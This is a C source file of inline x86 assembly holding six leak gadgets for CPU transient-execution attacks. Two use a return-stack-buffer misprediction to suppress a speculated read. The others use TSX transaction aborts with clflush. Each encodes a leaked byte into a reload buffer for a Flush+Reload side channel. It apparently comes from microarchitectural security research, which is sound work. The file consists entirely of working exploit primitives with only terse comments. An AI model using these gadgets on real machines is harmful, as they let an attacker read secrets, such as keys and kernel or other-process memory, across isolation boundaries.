/* Speculated read, suppressed with RSB misprediction. */
static inline __attribute__((always_inline)) void speculate_leak_normal(unsigned char *leak, unsigned char *reloadbuffer) {
	asm volatile(
	// call which never returns
	"call 2f\n"
	// speculated read
	"movq (%0), %%rax\n"
	"andq $0xff, %%rax\n"
	"shl $0xa, %%rax\n"
	"prefetcht0 (%%rax, %1)\n"
	// infinite loop
	"3: pause\n"
	"jmp 3b\n"
	// call target
	"2:\n"
	"movabs $1f, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"mov %%eax, (%%rsp)\n"
	"retq\n"
	// actual return point
	"1:\n"
	::"r"(leak), "r"(reloadbuffer):"rax"
	);
}

/* Speculated read, suppressed with RSB misprediction, with a clflush. */
static inline __attribute__((always_inline)) void speculate_leak_clflush(unsigned char *leak, unsigned char *reloadbuffer, unsigned char *to_flush) {
	asm volatile(
	// call which never returns
	"call 2f\n"
	// flush a page
	"clflush (%2)\n"
	// speculated read
	"movq (%0), %%rax\n"
	"andq $0xff, %%rax\n"
	"shl $0xa, %%rax\n"
	"prefetcht0 (%%rax, %1)\n"
	// infinite loop
	"3: pause\n"
	"jmp 3b\n"
	// call target
	"2:\n"
	"movabs $1f, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"imulq $1, %%rax, %%rax\n"
	"mov %%eax, (%%rsp)\n"
	"retq\n"
	// actual return point
	"1:\n"
	::"r"(leak), "r"(reloadbuffer),"r"(to_flush):"rax"
	);
}


/* cache-conflict TSX abort (temporal), plus a clflush */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush(unsigned char *leak, unsigned char *reloadbuffer, unsigned char *flushbuffer) {
	asm volatile(
	// leak setup
	"clflush (%0)\n"
	"sfence\n"
	// clflush
	"clflush (%2)\n"
	// transaction
	"xbegin 1f\n"
	"movzbq 0x0(%0), %%rax\n"
	"shl $0xa, %%rax\n"
	"movzbq (%%rax, %1), %%rax\n"
	"xend\n"
	"1:\n"
	::"r"(leak), "r"(reloadbuffer), "r"(flushbuffer):"rax"
	);
}

/* tsxabort_leak_clflush with a bitshift to get bytes at non-zero offsets */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_shifted(unsigned char *leak, unsigned char *reloadbuffer, unsigned char *flushbuffer, uint8_t shift) {
	asm volatile(
	// leak setup
	"clflush (%0)\n"
	"sfence\n"
	// clflush
	"clflush (%0)\n"
	// transaction
	"xbegin 1f\n"
	"movdqu 0x0(%0), %%xmm0\n"
	"movq %%xmm0, %%rax\n"
	"shr %%cl, %%rax\n"
	"and $0xff, %%rax\n"
	"shl $0xa, %%rax\n"
	"movzbq (%%rax, %1), %%rax\n"
	"xend\n"
	"1:\n"
	::"r"(leak), "r"(reloadbuffer), "r"(flushbuffer), "c"(shift):"rax","xmm0"
	);
}

/* cache-conflict TSX abort (temporal), bare */
static inline __attribute__((always_inline)) void tsxabort_leak_bareconflict(unsigned char *leak, unsigned char *reloadbuffer, unsigned char *flushbuffer) {
	asm volatile(
	// leak setup
	"clflush (%0)\n"
	"sfence\n"
	// transaction
	"xbegin 1f\n"
	"movzbq 0x0(%0), %%rax\n"
	"shl $0xa, %%rax\n"
	"movzbq (%%rax, %1), %%rax\n"
	"xend\n"
	"1:\n"
	::"r"(leak), "r"(reloadbuffer), "r"(flushbuffer):"rax"
	);
}

/* just read from a pointer inside TSX */
static inline __attribute__((always_inline)) void tsx_leak_read_normal(unsigned char *leak, unsigned char *reloadbuffer) {
	asm volatile(
	"xbegin 1f\n"
	"movzbq 0x0(%0), %%rax\n"
	"shl $0xa, %%rax\n"
	"movzbq (%%rax, %1), %%rax\n"
	"xend\n"
	"1:\n"
	::"r"(leak), "r"(reloadbuffer):"rax"
	);
}


